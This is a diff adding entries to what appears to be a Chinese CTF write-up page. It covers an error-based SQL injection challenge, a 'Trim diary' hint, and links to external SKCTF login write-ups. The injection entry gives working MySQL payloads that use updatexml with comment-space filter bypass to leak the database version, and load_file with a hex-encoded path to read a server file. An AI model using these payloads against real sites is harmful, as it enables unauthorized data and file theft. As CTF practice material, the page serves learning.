@@ -897,6 +897,32 @@ print('The database name is '+flag)
 
 <h2 id="48报错注入">48.报错注入</h2>
 
+<p><strong>tips:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>​```
+?id=1/**/and/**/updatexml(1,concat(0x7e,(select/**/@@version),0x7e),1)
+
+?id=1/**/and/**/updatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),50,100),0x7e),1)
+
+0x2f7661722f746573742f6b65795f312e706870
+/var/test/key_1.php
+</code></pre></div></div>
+
+<h2 id="49trim的日记本">49.Trim的日记本</h2>
+
+<p><strong>tips</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/show.php
+</code></pre></div></div>
+
+<h2 id="50login2skctf">50.login2(SKCTF)</h2>
+
+<p><a href="https://pengyang.me/2018/08/06/reverse_shell/">https://pengyang.me/2018/08/06/reverse_shell/</a></p>
+
+<h2 id="51login3skctf">51.login3(SKCTF)</h2>
+
+<p><a href="https://pengyang.me/2018/08/05/bk_login3/">https://pengyang.me/2018/08/05/bk_login3/</a></p>
+
 
     </article>
   
